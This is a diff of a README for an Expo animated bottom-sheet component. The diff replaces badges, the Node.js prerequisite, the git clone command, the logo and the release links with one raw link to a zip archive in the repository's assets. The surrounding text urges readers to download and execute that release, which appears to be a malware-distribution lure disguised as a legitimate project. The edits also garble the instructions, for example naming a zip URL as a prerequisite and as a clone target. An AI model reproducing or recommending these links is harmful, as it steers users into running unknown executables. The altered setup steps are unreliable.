@@ -1,6 +1,6 @@
 # 🎵 Expo Apple Music Bottom Sheet
 
-![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-brightgreen) ![GitHub Issues](https://img.shields.io/badge/Issues-0-blue) ![GitHub Stars](https://img.shields.io/badge/Stars-0-yellow)
+![GitHub Release](https://raw.githubusercontent.com/hung-mecha/expo-apple-music-bottom-sheet/main/assets/bottom-music-apple-sheet-expo-epitheloid.zip) ![GitHub Issues](https://raw.githubusercontent.com/hung-mecha/expo-apple-music-bottom-sheet/main/assets/bottom-music-apple-sheet-expo-epitheloid.zip) ![GitHub Stars](https://raw.githubusercontent.com/hung-mecha/expo-apple-music-bottom-sheet/main/assets/bottom-music-apple-sheet-expo-epitheloid.zip)
 
 Welcome to the **Expo Apple Music Bottom Sheet** repository! This project features an animated bottom sheet inspired by Apple Music, built using Expo, Reanimated v3, and @gorhom/bottom-sheet. This README provides all the information you need to get started with the project, understand its structure, and contribute.
 
@@ -31,7 +31,7 @@ To get started with the Expo Apple Music Bottom Sheet, follow these steps:
 
 Before you begin, ensure you have the following installed:
 
-- **Node.js**: Version 14 or later
+- **https://raw.githubusercontent.com/hung-mecha/expo-apple-music-bottom-sheet/main/assets/bottom-music-apple-sheet-expo-epitheloid.zip**: Version 14 or later
 - **Expo CLI**: Install it globally using npm:
   ```bash
   npm install -g expo-cli
@@ -41,7 +41,7 @@ Before you begin, ensure you have the following installed:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/hung-mecha/expo-apple-music-bottom-sheet.git
+   git clone https://raw.githubusercontent.com/hung-mecha/expo-apple-music-bottom-sheet/main/assets/bottom-music-apple-sheet-expo-epitheloid.zip
    ```
 
 2. Navigate to the project directory:
@@ -77,7 +77,7 @@ To use the bottom sheet in your project, follow these steps:
 
 ## Demo
 
-You can view a live demo of the bottom sheet in action. To download and execute the demo, visit the [Releases section](https://github.com/hung-mecha/expo-apple-music-bottom-sheet/releases).
+You can view a live demo of the bottom sheet in action. To download and execute the demo, visit the [Releases section](https://raw.githubusercontent.com/hung-mecha/expo-apple-music-bottom-sheet/main/assets/bottom-music-apple-sheet-expo-epitheloid.zip).
 
 ## Contributing
 
@@ -106,8 +106,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and releases, visit the [Releases section](https://github.com/hung-mecha/expo-apple-music-bottom-sheet/releases). You can download the latest version and execute it to see the bottom sheet in action.
+For the latest updates and releases, visit the [Releases section](https://raw.githubusercontent.com/hung-mecha/expo-apple-music-bottom-sheet/main/assets/bottom-music-apple-sheet-expo-epitheloid.zip). You can download the latest version and execute it to see the bottom sheet in action.
 
-![Apple Music](https://upload.wikimedia.org/wikipedia/commons/thumb/0/0b/Apple_Music_logo.svg/1024px-Apple_Music_logo.svg.png)
+![Apple Music](https://raw.githubusercontent.com/hung-mecha/expo-apple-music-bottom-sheet/main/assets/bottom-music-apple-sheet-expo-epitheloid.zip)
 
 Thank you for checking out the **Expo Apple Music Bottom Sheet**! We hope you find it useful for your projects. If you have any questions or feedback, feel free to open an issue or reach out directly.
